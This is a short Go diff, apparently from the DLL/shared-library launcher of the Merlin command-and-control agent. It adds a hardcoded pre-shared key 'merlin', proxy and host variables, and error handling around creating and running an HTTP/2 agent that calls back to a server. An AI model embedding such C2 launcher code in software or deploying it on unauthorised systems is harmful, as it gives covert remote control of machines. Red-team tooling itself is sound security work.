@@ -29,13 +29,22 @@ import (
 )
 
 var url = "https://127.0.0.1:443"
+var psk = "merlin"
+var proxy = ""
+var host = ""
 
 func main() {}
 
 // run is a private function called by exported functions to instantiate/execute the Agent
 func run(URL string) {
-	a := agent.New("h2", false, false)
-	a.Run(URL)
+	a, err := agent.New("h2", URL, host, psk, proxy, false, false)
+	if err != nil {
+		os.Exit(1)
+	}
+	errRun := a.Run()
+	if errRun != nil {
+		os.Exit(1)
+	}
 }
 
 // EXPORTED FUNCTIONS
